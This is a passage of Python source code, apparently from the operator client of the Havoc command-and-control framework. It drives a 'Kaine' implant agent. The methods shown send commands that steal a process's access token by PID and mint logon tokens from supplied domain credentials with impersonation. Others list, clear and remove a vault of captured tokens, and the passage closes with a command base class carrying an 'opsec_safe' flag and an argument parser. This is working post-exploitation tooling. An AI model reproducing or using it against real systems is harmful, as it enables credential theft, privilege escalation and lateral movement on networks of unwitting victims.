                stolen from the specified token

            uid:
                the uid string (utf-16le) that has been
                retrieved from the stolen token

            task-uuid:
                uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"    : "steal",
                "pid"        : process_id,
                "impersonate": impersonate,
                "vault-save" : vault_save
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        task = ctx[ 'task-uuid' ]
        ctx  = ctx[ 'return' ]

        return ctx[ 'handle' ], ctx[ 'uid' ], task

    def token_make(
        self,
        domain        : str,
        username      : str,
        password      : str,
        local_token   : bool = True,
        impersonate   : bool = True,
        vault_save    : bool = True,
        wait_to_finish: bool = True
    ) -> tuple[int, str, int]:
        """
        generate token from valid credentials

        :param domain:
            logon domain name

        :param username:
            logon username

        :param password:
            logon password

        :param local_token:
            if local token should be generated to access other users directories

        :param vault_save:
            save token to vault (default: true)

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (token-handle, uid, task-uuid)

            token-handle:
                process token handle that has been
                stolen from the specified token

            uid:
                the uid string (utf-16le) that has been
                retrieved from the stolen token.

                Tho it won't be in the name of the newly
                generated user token rather it is going
                to be applied to the current token (when impersonated).

            task-uuid:
                uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"     : "make",
                "domain"      : domain,
                "username"    : username,
                "password"    : password,
                "local-token" : local_token,
                "impersonate" : impersonate,
                "vault-save"  : vault_save
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        task = ctx[ 'task-uuid' ]
        ctx  = ctx[ 'return' ]

        return ctx[ 'handle' ], ctx[ 'uid' ], task

    def token_vault_list(
        self,
        wait_to_finish: bool = True
    ) -> tuple[int, list[dict], int]:
        """
        get all captured and saved tokens inside the vault

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            returning a tuple -> (current-token, tokens, task-uuid)

            current-token:
                is the current impersonated token from the vault

            tokens:
                captured and saved tokens inside the vault

            task-uuid:
                uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control" : "vault-list",
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'current-token' ], ctx[ 'return' ], ctx[ 'task-uuid' ]

    def token_vault_clear(
        self,
        wait_to_finish: bool = True
    ) -> int:
        """
        clear all captured and saved tokens inside the vault

        :param wait_to_finish:
            should wait for returned data (default: true)

        :return:
            uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control" : "vault-clear",
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'task-uuid' ]

    def token_vault_remove(
        self,
        token_handle  : int,
        wait_to_finish: bool = True
    ) -> int:
        """
        clear all captured and saved tokens inside the vault

        :param token_handle
            token handle to remove

        :param wait_to_finish:

            should wait for returned data (default: true)

        :return:
            uuid task
        """

        ctx = self.agent_execute( {
            "command":   "IoTokenControl",
            "arguments": {
                "control"     : "vault-remove",
                "token-handle": token_handle
            }
        }, wait_to_finish )

        if 'error' in ctx:
            raise Exception( ctx[ 'error' ] )

        if 'status' in ctx:
            if ctx[ 'status' ] != 'STATUS_SUCCESS':
                raise Exception( ctx[ 'status' ] )

        return ctx[ 'task-uuid' ]

@pyhavoc.agent.HcAgentExport
class HcKaineCommand:

    def __init_subclass__( cls, **kwargs ):
        KAINE_COMMANDS.append( cls )

    def __init__( self, agent: HcKaine ):

        self.__agent     = agent
        self.command     = ""
        self.description = ""
        self.is_module   = False
        self.opsec_safe  = True
        self.self_side   = False
        self.parser      = None
        self.min_args    = 0

        return

    def agent( self ) -> HcKaine:
        return self.__agent

    def arguments(
        self
    ):
        pass

    def _args_handle(
        self,
        args: list[ str ]
    ):
        parser_args = None
        self.parser = KnArgumentParser( prog=self.command, description=self.description, exit_on_error=False )

        self.arguments()

        try:
            parser_args = self.parser.parse_args( args[ 1: ] )
        except KnArgumentUsageError as err:
            self.agent().console_input( ' '.join( args ), local_only=True )

            prog, message, usage = err.args
            self.agent().console_print( f"{prog}: {message}" )
            self.agent().console_print( usage )
            return

        except KnArgumentExit as err:
            self.agent().console_input( ' '.join( args ), local_only=True )

            help, status = err.args
            self.agent().console_print( help )
            return

        except argparse.ArgumentError as err:
            self.agent().console_input( ' '.join( args ), local_only=True )
            self.agent().console_print( f"{err}" )

        return parser_args


    def execute(
        self,
        args
    ):
        pass

@pyhavoc.agent.HcAgentExport
class KnArgumentExit(BaseException):
    pass

@pyhavoc.agent.HcAgentExport
class KnArgumentError(BaseException):
    pass

@pyhavoc.agent.HcAgentExport
class KnArgumentUsageError(BaseException):
    pass

@pyhavoc.agent.HcAgentExport
class KnArgumentParser( argparse.ArgumentParser ):

    def __init__( self, *args, **kwargs ):
        if 'formatter_class' not in kwargs:
            kwargs['formatter_class'] = argparse.RawDescriptionHelpFormatter

        kwargs['exit_on_error'] = False

        super().__init__( *args, **kwargs )

    def exit( self, status=0, message=None ):
        raise KnArgumentExit( message, status )

    def error(self, message):
        raise KnArgumentUsageError( self.prog, message, self.format_usage() )

    def print_help( self, file = None ):
        raise KnArgumentExit( self.format_help(), 0 )
